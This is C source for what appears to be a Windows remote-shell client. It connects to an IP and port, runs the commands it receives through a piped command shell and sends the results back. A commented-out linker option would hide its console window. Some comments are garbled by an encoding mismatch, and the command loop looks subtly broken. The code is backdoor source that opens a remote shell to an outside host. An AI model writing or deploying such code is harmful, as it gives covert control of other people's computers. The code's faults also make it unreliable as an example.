#include "main.h"

//���ؽ���
//subsystem������ֵΪ��windows�������ʾ��Ӧ�ó�������ʱ����Ҫ����̨
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

int main()
{
	//CreateProcess(NULL, (LPSTR)"calc.exe", NULL, NULL, TRUE, 0, NULL, NULL, 0, 0);

	char szCmd[512];
	char szResultBuffer[4096] = { 0 };
	char szSendBuf[MAX_PATH] = { 0 };
	DWORD dwResultBufferSize = 4096;
	char ipaddr[20] = "192.168.0.1";
	int port = 6666;
	char* cmdPath = returnRevc();

	//printf("����������IP�Ͷ˿ڣ�����192.168.0.1 8888\n");
	scanf("%s %d", ipaddr, &port);


	if (FALSE == ConnectionPrepare(ipaddr, port))
	{
		printf("Connection Timeout\n");
		system("pause");
		return -1;
	}
	printf("\nConnection OK\n");
	//getchar();

	while (TRUE)
	{
		if (strcmp(cmdPath, "exit") == 0)
			return -1;
		if (cmdPath[0] != 0 && cmdPath[1] != 0)
		{
			strcat(cmdPath, "\r\n");
			if (FALSE == PipeCmd(cmdPath, szResultBuffer, dwResultBufferSize))
			{
				ZeroMemory(cmdPath, sizeof(cmdPath));
				printf("PipeCmd Timeout\n");
				system("pause");
				return -1;
			}
			else
			{
				ZeroMemory(cmdPath, sizeof(cmdPath));
				SendMsg(szResultBuffer);
			}
		}
	}

	system("pause");
	return 0;
}